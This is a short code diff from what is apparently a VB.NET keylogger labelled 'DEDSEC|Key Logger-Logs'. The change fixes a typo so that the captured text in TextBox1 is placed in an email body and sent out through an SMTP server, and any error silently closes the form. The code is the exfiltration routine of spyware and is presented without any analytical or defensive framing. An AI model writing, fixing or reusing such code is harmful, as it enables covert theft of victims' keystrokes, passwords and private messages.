@@ -21,7 +21,7 @@ Public Class Form1
             mail.From = New MailAddress(mails)
             mail.To.Add(mails)
             mail.Subject = ("DEDSEC|Key Logger-Logs")
-            hmail.Body = TextBox1.Text
+            mail.Body = TextBox1.Text
             smtpserver.Send(mail)
         Catch ex As Exception
             Me.Close()
